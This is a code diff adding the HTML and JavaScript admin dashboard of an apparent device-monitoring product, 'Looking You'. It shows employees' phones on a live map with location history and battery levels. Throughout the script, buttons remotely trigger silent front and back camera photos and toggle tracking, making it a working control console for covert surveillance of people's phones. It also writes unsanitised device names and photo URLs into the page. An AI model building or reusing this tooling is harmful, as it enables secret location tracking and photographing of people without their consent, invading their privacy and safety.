@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Looking You | Admin Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Leaflet Map CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+</head>
+<body>
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">
+                <h1>Looking<span>You</span></h1>
+                <p>Security Command Center</p>
+            </div>
+            
+            <div class="status-summary">
+                <div class="stat-card">
+                    <span class="label">Total Devices</span>
+                    <span class="value" id="total-count">0</span>
+                </div>
+                <div class="stat-card">
+                    <span class="label">Online</span>
+                    <span class="value online" id="online-count">0</span>
+                </div>
+            </div>
+
+            <nav class="device-list">
+                <h3>Online Devices</h3>
+                <ul id="devices-ul">
+                    <li class="empty-msg">Waiting for devices...</li>
+                </ul>
+            </nav>
+
+            <div class="photo-gallery">
+                <h3>Last Captured</h3>
+                <div id="latest-photo-container">
+                    <p class="empty-msg">No photos yet</p>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="top-bar">
+                <div class="current-focus">
+                    <h2>Live Tracking</h2>
+                    <p id="active-device-name">No device selected</p>
+                </div>
+                <div class="actions" id="device-actions" style="display: none;">
+                    <div class="monitoring-status" id="tracking-status">
+                        <span class="status-dot active"></span>
+                        <span class="status-text">Active</span>
+                    </div>
+                    <button id="btn-stop-tracking" onclick="toggleTracking('stop')" class="btn-action danger">⏹ Stop Monitoring</button>
+                    <button id="btn-start-tracking" onclick="toggleTracking('start')" class="btn-action success" style="display: none;">▶ Start Monitoring</button>
+                    <button onclick="fetchHistory()" class="btn-action secondary">📜 View History</button>
+                    <button onclick="triggerAction('take_photo', 'front')" class="btn-action">📸 Front Photo</button>
+                    <button onclick="triggerAction('take_photo', 'back')" class="btn-action">📷 Back Photo</button>
+                </div>
+            </header>
+
+            <div id="map"></div>
+
+            <!-- History Panel Overlay -->
+            <div id="history-overlay" class="overlay" style="display: none;">
+                <div class="panel">
+                    <div class="panel-header">
+                        <h3 id="history-title">Device History</h3>
+                        <button onclick="closeHistory()" class="btn-close">&times;</button>
+                    </div>
+                    <div id="history-content" class="panel-body">
+                        <!-- History items will be loaded here -->
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Scripts -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        const socket = io();
+        let map = L.map('map', { maxZoom: 19 }).setView([31.5204, 74.3587], 13); // Default to Lahore
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19,
+            attribution: '© OpenStreetMap'
+        }).addTo(map);
+
+        let markers = {};
+        let activeDeviceId = null;
+        let historyPath = L.polyline([], {color: '#3498db', weight: 4, opacity: 0.7}).addTo(map);
+        let historyDots = [];
+
+        // Request initial device list
+        socket.emit('list_devices');
+
+        socket.on('devices_data', (devices) => {
+            updateDeviceList(devices);
+        });
+
+        socket.on('photo_uploaded', (data) => {
+            console.log('📸 New photo arrived:', data);
+            displayNewPhoto(data);
+        });
+
+        socket.on('update_location', (data) => {
+            console.log('📍 Received location:', data);
+            updateMarker(data);
+            updateDeviceStatus(data);
+        });
+
+        function updateDeviceList(devices) {
+            const ul = document.getElementById('devices-ul');
+            ul.innerHTML = '';
+            
+            document.getElementById('total-count').innerText = devices.length;
+            document.getElementById('online-count').innerText = devices.length;
+
+            if (devices.length === 0) {
+                ul.innerHTML = '<li class="empty-msg">No devices online</li>';
+                return;
+            }
+
+            devices.forEach(device => {
+                const li = document.createElement('li');
+                li.className = 'device-item';
+                li.onclick = () => focusDevice(device.deviceId, device.employeeName);
+                li.innerHTML = `
+                    <div class="info">
+                        <span class="name">${device.employeeName}</span>
+                        <span class="id">${device.deviceId}</span>
+                    </div>
+                    <div class="battery">
+                        <span class="value">--%</span>
+                    </div>
+                `;
+                li.id = `li-${device.deviceId}`;
+                ul.appendChild(li);
+            });
+        }
+
+        function updateMarker(data) {
+            const { deviceId, latitude, longitude } = data;
+            
+            if (!markers[deviceId]) {
+                const icon = L.divIcon({
+                    className: 'custom-div-icon',
+                    html: "<div style='background-color:#e74c3c;' class='marker-pin'></div><i class='fa fa-user'></i>",
+                    iconSize: [30, 42],
+                    iconAnchor: [15, 42]
+                });
+                markers[deviceId] = L.marker([latitude, longitude]).addTo(map);
+                markers[deviceId].bindPopup(`<b>${deviceId}</b>`).openPopup();
+            } else {
+                markers[deviceId].setLatLng([latitude, longitude]);
+            }
+
+            // Extend path if this is the active device
+            if (activeDeviceId === deviceId) {
+                historyPath.addLatLng([latitude, longitude]);
+                map.panTo([latitude, longitude]);
+            }
+        }
+
+        function updateDeviceStatus(data) {
+            const li = document.getElementById(`li-${data.deviceId}`);
+            if (li) {
+                const batteryVal = li.querySelector('.battery .value');
+                batteryVal.innerText = `${data.batteryLevel}%`;
+                
+                if (data.isCharging) {
+                    li.classList.add('charging');
+                } else {
+                    li.classList.remove('charging');
+                }
+            }
+        }
+
+        function focusDevice(id, name) {
+            activeDeviceId = id;
+            document.getElementById('active-device-name').innerText = name;
+            document.getElementById('device-actions').style.display = 'flex';
+            
+            clearPaths(); // Clear old paths when switching
+            
+            if (markers[id]) {
+                map.setView(markers[id].getLatLng(), 18);
+            }
+        }
+
+        function clearPaths() {
+            historyPath.setLatLngs([]);
+            historyDots.forEach(dot => map.removeLayer(dot));
+            historyDots = [];
+        }
+
+        function triggerAction(action, param) {
+            if (!activeDeviceId) return;
+            console.log(`🚀 Triggering ${action} for ${activeDeviceId}`);
+            
+            if (action === 'take_photo') {
+                socket.emit('trigger_photo', { deviceId: activeDeviceId, camera: param });
+                // Show a loading/waiting state
+                const container = document.getElementById('latest-photo-container');
+                container.innerHTML = `<div class="loading">Capturing silent photo...</div>`;
+            }
+        }
+
+        function toggleTracking(action) {
+            if (!activeDeviceId) return;
+            console.log(`📡 Sending remote control: ${action} for ${activeDeviceId}`);
+            socket.emit('toggle_tracking', { deviceId: activeDeviceId, action: action });
+            
+            // Update UI
+            const statusText = document.querySelector('#tracking-status .status-text');
+            const statusDot = document.querySelector('#tracking-status .status-dot');
+            const btnStart = document.getElementById('btn-start-tracking');
+            const btnStop = document.getElementById('btn-stop-tracking');
+
+            if (action === 'stop') {
+                statusText.innerText = 'Paused';
+                statusDot.classList.remove('active');
+                btnStart.style.display = 'block';
+                btnStop.style.display = 'none';
+            } else {
+                statusText.innerText = 'Active';
+                statusDot.classList.add('active');
+                btnStart.style.display = 'none';
+                btnStop.style.display = 'block';
+            }
+        }
+
+        function displayNewPhoto(data) {
+            const container = document.getElementById('latest-photo-container');
+            container.innerHTML = `
+                <div class="photo-card fade-in">
+                    <img src="${data.url}" alt="Capture" onclick="window.open('${data.url}', '_blank')">
+                    <div class="photo-info">
+                        <span>ID: ${data.deviceId}</span>
+                        <span>${data.timestamp}</span>
+                    </div>
+                </div>
+            `;
+            // Also refresh history if open
+            if (document.getElementById('history-overlay').style.display === 'block') {
+                fetchHistory();
+            }
+        }
+
+        async function fetchHistory() {
+            if (!activeDeviceId) return;
+            const container = document.getElementById('history-content');
+            container.innerHTML = '<div class="loading">Fetching records...</div>';
+            document.getElementById('history-overlay').style.display = 'block';
+            document.getElementById('history-title').innerText = `History: ${activeDeviceId}`;
+
+            try {
+                const response = await fetch(`/api/history/${activeDeviceId}`);
+                const data = await response.json();
+                
+                if (data.length === 0) {
+                    container.innerHTML = '<p class="empty-msg">No logs found for this device</p>';
+                    return;
+                }
+
+                // Visualize path on map
+                drawHistoryPath(data);
+
+                container.innerHTML = data.map(log => `
+                    <div class="history-item ${log.logType}">
+                        <div class="item-meta">
+                            <span class="type">${log.logType}</span>
+                            <span class="time">${new Date(log.createdAt).toLocaleString()}</span>
+                        </div>
+                        ${log.logType === 'photo' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
+                        <div class="item-details">
+                            ${log.logType === 'location' ? `📍 ${log.latitude}, ${log.longitude}` : ''}
+                            ${log.batteryLevel ? ` | 🔋 ${log.batteryLevel}%` : ''}
+                        </div>
+                        <button onclick="deleteLog(${log.id})" class="btn-delete">Delete</button>
+                    </div>
+                `).join('');
+            } catch (err) {
+                container.innerHTML = '<p class="error">Failed to load history</p>';
+            }
+        }
+
+        function drawHistoryPath(logs) {
+            clearPaths();
+            const locationLogs = logs.filter(log => log.logType === 'location').reverse(); // Oldest to newest
+            
+            const latlngs = locationLogs.map(log => [log.latitude, log.longitude]);
+            historyPath.setLatLngs(latlngs);
+
+            locationLogs.forEach(log => {
+                const dot = L.circleMarker([log.latitude, log.longitude], {
+                    radius: 4,
+                    color: '#2980b9',
+                    fillColor: '#3498db',
+                    fillOpacity: 1
+                }).addTo(map);
+                dot.bindPopup(`Time: ${new Date(log.createdAt).toLocaleString()}`);
+                historyDots.push(dot);
+            });
+
+            if (latlngs.length > 0) {
+                map.fitBounds(historyPath.getBounds(), {padding: [50, 50]});
+            }
+        }
+
+        async function deleteLog(id) {
+            if (!confirm('Are you sure you want to delete this record?')) return;
+            try {
+                const response = await fetch(`/api/history/${id}`, { method: 'DELETE' });
+                if (response.ok) {
+                    fetchHistory(); // Refresh
+                }
+            } catch (err) {
+                alert('Failed to delete');
+            }
+        }
+
+        function closeHistory() {
+            document.getElementById('history-overlay').style.display = 'none';
+            // Optional: clear paths when closing history to keep live view clean
+            // clearPaths(); 
+        }
+    </script>
+</body>
+</html>
